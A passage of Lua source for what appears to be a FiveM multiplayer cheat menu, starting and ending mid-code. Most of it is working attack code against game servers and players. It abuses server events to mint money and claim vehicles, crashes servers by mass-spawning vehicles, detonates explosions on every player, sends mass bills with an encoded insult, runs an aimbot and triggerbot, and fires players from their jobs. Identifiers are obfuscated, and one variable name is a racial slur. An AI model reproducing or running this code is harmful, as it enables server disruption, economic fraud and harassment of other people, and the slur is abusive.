                            until tv >= cI[cJ]
                        else
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                if cI[cJ] > 0.0 then
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                else
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                end
                            until tv >= cI[cJ]
                        end
                    end
                end
            end

            if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
            end

            if showCoords then 
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
                bf("~r~X:~s~ "..roundx,0.05,0.00)
                bf("~r~Y:~s~ "..roundy,0.11,0.00)
                bf("~r~Z:~s~ "..roundz,0.17,0.00)
            end

            if bulletGun then
                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = GetHashKey(bullets[selectedBullet])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, false)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                end

            end

            if wybuchall then
                for i = 0, 128 do
                        AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
            end

            if esxdestroy111 then
                for i = 0, 128 do
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('payforplayer2',9999999999)
                        TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)  
                        TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)  
                        TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)  
                        TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)  
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\97\108\101\32\99\104\117\106\111\119\121\32\116\101\110\32\115\101\114\118\101\114\101\107", 10000000)
                end
            end
            
            if servercrasher then
                local camion = "phantom"
                local avion = "CARGOPLANE"
                local avion2 = "luxor"
                local heli = "maverick"
                local random = "bus"
                CreateVehicle(GetHashKey(avion), 0, 0, -10, true, true)
                CreateVehicle(GetHashKey(avion), 0, 0, -50, true, true)
                CreateVehicle(GetHashKey(avion), 0, 0, -100, true, true)
                CreateVehicle(GetHashKey(avion2), 0, 3, -1000, true, true)
                CreateVehicle(GetHashKey(avion2), 1621, 0, -50, true, true)
                CreateVehicle(GetHashKey(avion2), 1242, 1, -100, true, true)
                CreateVehicle(GetHashKey(camion), 612, 4, -10, true, true)
                CreateVehicle(GetHashKey(camion), 1234, 0, -50, true, true)
                CreateVehicle(GetHashKey(camion), 0, 0, -100, true, true)
                CreateVehicle(GetHashKey(random), 512, 1233, -10, true, true)
                CreateVehicle(GetHashKey(random), 155, 2, -50, true, true)
                CreateVehicle(GetHashKey(random), 333, 0, -100, true, true)
                CreateVehicle(GetHashKey(heli), -121, 100, -10, true, true)
                CreateVehicle(GetHashKey(heli), -121, 2555, -50, true, true)
                CreateVehicle(GetHashKey(heli), -121, 123, -100, true, true)
            end

            if nukeerekmordo then
                local camion = "phantom"
                local avion = "CARGOPLANE"
                local avion2 = "luxor"
                local heli = "maverick"
                local random = "bus"
                for i = 0, 128 do
                        while not HasModelLoaded(GetHashKey(avion)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(avion))
                        end
                        Citizen.Wait(200)

                        local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
                        CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
                        CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                        CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
                        CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
                        CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
                        CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
                        CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
                        CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                        CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
                        CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
                        CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                        CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
                        CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
                        CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
            end

            if VehSpeededzikmordo and IsPedInAnyVehicle(PlayerPedId(), true) then
                if IsControlPressed(0, 118) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
                elseif IsControlPressed(0, 109) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
                end
            end

            if triggerekmordo then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end

            if aimikmordo then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityVisible(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 1000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end

            DisplayRadar(true)

            if RainbowVeh then
                local ra = asudga76sd1(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
            end

                local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), true)
                if IsPedInAnyVehicle(PlayerPedId()) then
                    elseif driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 5.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                    end
                    
                
                    if superGrip then
                        SetVehicleGravityAmount(niggerVehicle, 20.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                    end
    
                    if enchancedGrip then
                        SetVehicleGravityAmount(niggerVehicle, 12.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                    end
    
                    if fdMode then
                        SetVehicleGravityAmount(niggerVehicle, 5.5)
                        SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                        SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                    end

            if t2x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
            end
            if t4x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
            end
            if t10x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
            end
            if t16x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
            end
            if txd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
            end
            if tbxd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
            end


            if Noclip then
                local currentSpeed = 2
                local noclipEntity =
                    IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                FreezeEntityPosition(PlayerPedId(), true)
                SetEntityInvincible(PlayerPedId(), true)

                local newPos = GetEntityCoords(entity)

                DisableControlAction(0, 32, true) --MoveUpOnly
                DisableControlAction(0, 268, true) --MoveUp

                DisableControlAction(0, 31, true) --MoveUpDown

                DisableControlAction(0, 269, true) --MoveDown
                DisableControlAction(0, 33, true) --MoveDownOnly

                DisableControlAction(0, 266, true) --MoveLeft
                DisableControlAction(0, 34, true) --MoveLeftOnly

                DisableControlAction(0, 30, true) --MoveLeftRight

                DisableControlAction(0, 267, true) --MoveRight
                DisableControlAction(0, 35, true) --MoveRightOnly

                DisableControlAction(0, 44, true) --Cover
                DisableControlAction(0, 20, true) --MultiplayerInfo

                local yoff = 0.0
                local zoff = 0.0

                if GetInputMode() == "MouseAndKeyboard" then
                    if IsDisabledControlPressed(0, 32) then
                        yoff = 0.5
                    end
                    if IsDisabledControlPressed(0, 33) then
                        yoff = -0.5
                    end
                    if IsDisabledControlPressed(0, 34) then
                        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
                    end
                    if IsDisabledControlPressed(0, 35) then
                        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
                    end
                    if IsDisabledControlPressed(0, 44) then
                        zoff = 0.21
                    end
                    if IsDisabledControlPressed(0, 20) then
                        zoff = -0.21
                    end
                end

                newPos =
                    GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

                local heading = GetEntityHeading(noclipEntity)
                SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
                SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(noclipEntity, heading)

                SetEntityCollision(noclipEntity, false, false)
                SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

                FreezeEntityPosition(noclipEntity, false)
                SetEntityInvincible(noclipEntity, false)
                SetEntityCollision(noclipEntity, true, true)
            end
        end
    end
)

function GetPlayers()
    local players = {}

    for i = 0, 128 do
        if NetworkIsPlayerActive(i) then
            table.insert(players, i)
        end
    end

    return players
end

function FirePlayer(SelectedPlayer)
    if ESX then
        ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

            local playerMatch = nil
            for i=1, #players, 1 do
                        label = players[i].name
                        value = players[i].source
                        name = players[i].name
                        if name == GetPlayerName(SelectedPlayer) then
                            playerMatch = players[i].identifier
                            debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
                        end
                        identifier = players[i].identifier
            end



            ESX.TriggerServerCallback('esx_society:setJob', function()
            end, playerMatch, 'unemployed', 0, 'hire')

        end)
    end
end

Citizen.CreateThread(
    function()
        FreezeEntityPosition(entity, false)
        local currentItemIndex = 1
        local asdhasdhas8dIndex = 1

        -- COMBO BOXES
    local currThemeIndex = 1
    local selThemeIndex = 1

    local currNoclipSpeedIndex = 1
    local selNoclipSpeedIndex = 1

    local currForcefieldRadiusIndex = 1
    local selForcefieldRadiusIndex = 1

    local Outfits = {}
    local currClothingIndex_1 = 1
    local selClothingIndex_1 = 1
    local currClothingIndex_2 = 1
    local selClothingIndex_2 = 1
    local currClothingIndex_3 = 1
    local selClothingIndex_3 = 1
    local currClothingIndex_4 = 1
    local selClothingIndex_4 = 1
    local currClothingIndex_5 = 1
    local selClothingIndex_5 = 1

    local function GetCurrentOutfit(target)
    outfit = {}



    return outfit
end

local function SetCurrentOutfit(outfit)

end

local function RandomClothes(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
end

function ShowInfo(text)
  SetNotificationTextEntry("STRING")
  AddTextComponentString(text)
  DrawNotification(true, false)
end

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        TriggerServerEvent('esx_vehicleshop_import:setVehicleOwned', cx)
        hasidas8dgas('~g~~h~Success', false)
    else
        hasidas8dgas('~b~~h~Model is not valid!', true)
    end
end

function KeyboardInput(ao, ap, aq)
    AddTextEntry('FMMC_KEY_TIP1', ao .. ':')
    DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', ap, '', '', '', aq)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        AddTextEntry('FMMC_KEY_TIP1', '')
        local m = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return m
    else
        AddTextEntry('FMMC_KEY_TIP1', '')
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
local function ar()
    local as = {}
    for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
            as[#as + 1] = i
        end
    end
    return as
end

local function bP(bQ, bR)
    for i = 0, 10 do
        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        RequestModel(GetHashKey(bQ))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(bQ)) then
            local ped =
                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, false) and
                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, false)
            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                bM(ped)
                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                SetEntityInvincible(ped, true)
                SetPedCanSwitchWeapon(ped, true)
                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
            else
                Citizen.Wait(0)
            end
        end
    end
end

local function e()
    local name = GetPlayerName(PlayerId())
end
local h = false

local function hasidas8dgas(I, aw)
    SetNotificationTextEntry('STRING')
    AddTextComponentString(I)
    DrawNotification(aw, false)
    if rgbnot then
        for i = 0, 24 do
            i = i + 1
            SetNotificationBackgroundColor(i)
        end
    else
        SetNotificationBackgroundColor(24)
    end
end

function SpawnObjOnPlayer(modelHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)                  
    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
        end
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
 end

 local function bk()
    local ab=KeyboardInput("Enter Blip Name","",100)
    if ab==""then 
        drawNotification("~r~Invalid Blip Name!")
        return bk()
    else 
        local bh=KeyboardInput("Enter X pos","",100)
        local bi=KeyboardInput("Enter Y pos","",100)
        local bj=KeyboardInput("Enter Z pos","",100)
        if bh~=""and bi~=""and bj~=""then 
            local bl={{colour=75,model=84}}
            for _,bm in pairs(bl)do bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR=AddBlipForCoord(bh+0.5,bi+0.5,bj+0.5)
                SetBlipSprite(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.model)SetBlipsadha7sxzsa(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,4)
                SetBlipScale(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,0.9)SetBlipColour(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.colour)SetBlipAsShortRange(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,true)BeginTextCommandSetBlipName("STRING")
                AddTextComponentString(ab)
                EndTextCommandSetBlipName(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR)end 
            else 
                drawNotification("~r~Invalid coords!")
            end
        end 
    end

function TeleportToCoords()
    local x = KeyboardInput("Enter X Pos", "", 100)
    local y = KeyboardInput("Enter Y Pos", "", 100)
    local z = KeyboardInput("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then 
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotification("~g~Invalid Coords!")
    end
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        end

    end

local function bk()
    local ab=KeyboardInput("Enter Blip Name","",100)
    if ab==""then 
        drawNotification("~r~Invalid Blip Name!")
        return bk()
    else 
        local bh=KeyboardInput("Enter X pos","",100)
        local bi=KeyboardInput("Enter Y pos","",100)
        local bj=KeyboardInput("Enter Z pos","",100)
        if bh~=""and bi~=""and bj~=""then 
            local bl={{colour=75,model=84}}
            for _,bm in pairs(bl)do bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR=AddBlipForCoord(bh+0.5,bi+0.5,bj+0.5)
                SetBlipSprite(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.model)SetBlipsadha7sxzsa(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,4)
                SetBlipScale(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,0.9)SetBlipColour(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.colour)SetBlipAsShortRange(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,true)BeginTextCommandSetBlipName("STRING")
                AddTextComponentString(ab)
                EndTextCommandSetBlipName(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR)end 
            else 
                drawNotification("126 \114 \126 \73 \110 \118 \97 \108 \105 \100 \32 \99 \111 \111 \114 \100 \115 \33")
            end
        end 
    end

if gcphonedestroy then
    local numBase0 = math.random(100,999)
    local numBase1 = math.random(0,9999)
    local num = string.format("%03d-%04d", numBase0, numBase1 )
    local num2 = string.format("%03d-%04d", numBase0, numBase1 )
    local transmitter = num
    local receiver = num2
